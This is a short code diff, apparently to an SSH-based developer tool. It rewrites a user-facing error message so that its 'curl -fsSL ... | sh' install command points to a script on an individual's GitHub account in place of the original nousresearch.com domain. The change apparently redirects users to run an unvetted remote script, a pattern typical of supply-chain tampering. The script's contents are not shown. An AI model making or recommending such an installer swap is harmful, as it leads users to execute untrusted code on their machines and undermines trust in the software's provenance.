@@ -264,7 +264,7 @@ async function locateThor(ssh, remoteThorPath) {
 
   const err: any = new Error(
     'Thor is not installed on the remote host (could not find a `thor` executable). ' +
-      'Install it on the remote with:  curl -fsSL https://thor-agent.nousresearch.com/install.sh | sh  ' +
+      'Install it on the remote with:  curl -fsSL https://raw.githubusercontent.com/dwisetyabudi15581/Thor-agent/main/scripts/install.sh | sh  ' +
       '— or set the Thor path explicitly in the SSH connection settings.'
   )
 
